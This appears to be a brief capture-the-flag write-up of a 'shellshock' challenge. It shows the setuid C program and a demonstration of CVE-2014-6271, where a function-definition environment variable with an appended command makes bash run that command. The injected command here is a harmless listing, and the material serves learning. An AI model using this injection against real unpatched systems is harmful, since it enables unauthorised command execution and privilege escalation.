## shellshock

In `shellshock.c`
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());     // we have root permissions now
        system("/home/shellshock/bash -c 'echo shock_me'");     // run /home/shellshock/bash
        return 0;
}
```

### Shellshock(CVE-2014-6271)

Principle: error resolution for "() { :;}"

```sh
$ export vul='() { :; };/bin/ls'
$ bash
bash    flag    shellshock  shellshock.c
$ exit
exit
$ 
```